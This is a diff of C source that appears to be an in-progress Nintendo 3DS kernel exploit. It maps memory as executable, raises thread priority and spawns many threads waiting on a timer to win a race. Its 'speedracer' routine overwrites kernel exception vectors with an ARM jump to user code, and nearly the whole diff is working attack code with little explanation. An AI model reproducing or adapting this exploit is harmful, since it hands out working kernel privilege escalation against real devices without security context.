@@ -306,7 +306,7 @@ u32 ro_pop_lr_lsls_r1r1x2_strcs_r2r0x4_bxeq_lr = 0x14003d44;
 Handle wait_handles[256] = {0};
 const int num_waits = sizeof(wait_handles) / sizeof(wait_handles[0]);
 
-void thread_entrypoint()
+void wait_thread()
 {
 	s32 out = 0;
 
@@ -322,47 +322,40 @@ vu32 done = 1;
 
 void ktest()
 {
+	// wait for other thread to be ready
 	while(*(vu32*)&test_buf_mirror[0] == 0xdadadada) svcSleepThread(1 * 1000 * 1000);
 
-	// map to 0
+	// go exploit stuff
 	{
-		// Result ret = HB_ControlProcessMemory(&roHandle, 0, (u32)test_buf, 0x1000, MEMOP_MAP, MEMPERM_READ | MEMPERM_WRITE);
-		// Result ret = HB_ControlProcessMemory(&roHandle, 0x0de90000, (u32)test_buf, 0x1000, MEMOP_MAP, MEMPERM_READ | MEMPERM_WRITE);
-		Result ret = HB_ControlProcessMemory(&roHandle, 0x00000000, (u32)test_buf, 0x1000, MEMOP_MAP, MEMPERM_READ | MEMPERM_WRITE | MEMPERM_EXECUTE);
-		printf("ret %08X %08X\n", (unsigned int)ret, (unsigned int)test_buf);	
+		// printf("test %08X\n", *(unsigned int*)0x00000000);
+		printf("sup?\n");
 
-		if(!ret)
+		svcSleepThread(1 * 1000 * 1000);
+
+		Handle thread_handles[16] = {0};
+		const int num_threads = sizeof(thread_handles) / sizeof(thread_handles[0]);
+
+		Handle wait_obj = 0;
+
+		// svcCreatewait_obj(&wait_obj, true);
+		svcCreateTimer(&wait_obj, 2);
+
+		int i;
+		for(i = 0; i < num_waits; i++) wait_handles[i] = wait_obj;
+
+		for(i = 0; i < num_threads; i++)
 		{
-			// printf("test %08X\n", *(unsigned int*)0x00000000);
-			printf("sup?\n");
+			const u32 stack_len = 0x1000;
+			u8* stack = malloc(stack_len);
+
+			// Result ret = svcCreateThread(&thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x20, 0);
+			Result ret = svcCreateThread(&thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x20, 1);
+
+			printf("thread %02d %08X %08X %08X\n", i, (unsigned int)thread_handles[i], (unsigned int)ret, (unsigned int)test_buf_mirror[2]);
 
 			svcSleepThread(1 * 1000 * 1000);
 
-			Handle thread_handles[16] = {0};
-			const int num_threads = sizeof(thread_handles) / sizeof(thread_handles[0]);
-
-			Handle mutex = 0;
-
-			// svcCreateMutex(&mutex, true);
-			svcCreateTimer(&mutex, 2);
-
-			int i;
-			for(i = 0; i < num_waits; i++) wait_handles[i] = mutex;
-
-			for(i = 0; i < num_threads; i++)
-			{
-				const u32 stack_len = 0x1000;
-				u8* stack = malloc(stack_len);
-
-				// Result ret = svcCreateThread(&thread_handles[i], thread_entrypoint, 0, (u32*)(stack + stack_len), 0x20, 0);
-				Result ret = svcCreateThread(&thread_handles[i], thread_entrypoint, 0, (u32*)(stack + stack_len), 0x20, 1);
-
-				printf("thread %02d %08X %08X %08X\n", i, (unsigned int)thread_handles[i], (unsigned int)ret, (unsigned int)test_buf_mirror[2]);
-
-				svcSleepThread(1 * 1000 * 1000);
-
-				if(!done) break;
-			}
+			if(!done) break;
 		}
 	}
 
@@ -388,19 +381,35 @@ void hello()
 
 void speedracer()
 {
+	*(vu32*)&test_buf_mirror[0x0] = 0x00000040;
+
 	// write a jmp instruction!
 	*(vu32*)&test_buf_mirror[0x3] = 0xE51FF004; // ldr pc, [pc, #-4]
-	// *(vu32*)&test_buf_mirror[0x4] = 0xdeadbabe; // pc
 	*(vu32*)&test_buf_mirror[0x4] = (u32)&hello; // pc
+
+	u32 val = 0;
+
+	while(1)
+	{
+		val = *(vu32*)&test_buf_mirror[0x2];
+
+		if(val != 0xdadadada)
+		{
+			// *(vu32*)0xdead0000 = val;
+			break;
+		}
+	}
 
 	while(1)
 	{
 		*(vu32*)&test_buf_mirror[0x0] = 0x00000040;
-		*(vu32*)&test_buf_mirror[0x1] = 0xdff80000 + 0x644; // exception vector
+		// *(vu32*)&test_buf_mirror[0x1] = 0xdff80000 + 0x644; // exception vector
+		*(vu32*)&test_buf_mirror[0x1] = 0xdff80000 + 0x638; // exception vector
 		*(vu32*)&test_buf_mirror[0x2] = 0xb0b0b0b0;
-		*(vu32*)&test_buf_mirror[0x10] = 0xdff80000 + 0x644; // exception vector
+		// *(vu32*)&test_buf_mirror[0x10] = 0xdff80000 + 0x644; // exception vector
+		*(vu32*)&test_buf_mirror[0x10] = 0xdff80000 + 0x638; // exception vector
 		*(vu32*)&test_buf_mirror[0x11] = 0xd0d0d0d0;
-		*(vu32*)&test_buf_mirror[0x12] = 0xfff86550; // kthread - this is unlikely to be a fixed value so make sure to figure it out dynamically (should be possible by monitoring region)
+		*(vu32*)&test_buf_mirror[0x12] = val; // kthread
 	}
 
 	// svcExitThread();
@@ -523,28 +532,34 @@ int main(int argc, char **argv)
 		// printf("val %08X\n", (unsigned int)val);
 
 		aptOpenSession();
-		APT_SetAppCpuTimeLimit(NULL, 5);
+		APT_SetAppCpuTimeLimit(NULL, 30);
 		aptCloseSession();
+
+		// set max priority on current thread
+		svcSetThreadPriority(0xFFFF8000, 0x19);
 
 		const u32 stack_len = 0x10000;
 		u8* stack = malloc(stack_len);
 		
-		allocateHeapHax(0x1000, &test_buf, &test_buf_mirror);
-		memset(test_buf_mirror, 0xda, 0x1000);
+		test_buf = memalign(0x1000, 0x1000);
+		memset(test_buf, 0xda, 0x1000);
 
-		Handle thread = 0;
-		// ret = svcCreateThread(&thread, speedracer, 0, (u32*)(stack + stack_len), 0x20, 1);
-		ret = svcCreateThread(&thread, ktest, 0, (u32*)(stack + stack_len), 0x20, 1);
+		// map to 0
+		ret = HB_ControlProcessMemory(&roHandle, (u32)test_buf_mirror, (u32)test_buf, 0x1000, MEMOP_MAP, MEMPERM_READ | MEMPERM_WRITE | MEMPERM_EXECUTE);
+		printf("ret %08X %08X\n", (unsigned int)ret, (unsigned int)test_buf);
 
-		printf("hi\n");
+		if(!ret)
+		{
+			Handle thread = 0;
+			
+			// ret = svcCreateThread(&thread, speedracer, 0, (u32*)(stack + stack_len), 0x20, 1);
+			ret = svcCreateThread(&thread, ktest, 0, (u32*)(stack + stack_len), 0x20, 1);
 
-		// ktest();
-		speedracer();
+			printf("hi\n");
 
-		// if(!ret)
-		// {
-		// 	printf("test %08X %08X\n", (unsigned int)test_buf[0], *(unsigned int*)NULL);
-		// }
+			// ktest();
+			speedracer();
+		}
 	}
 
 	// Main loop
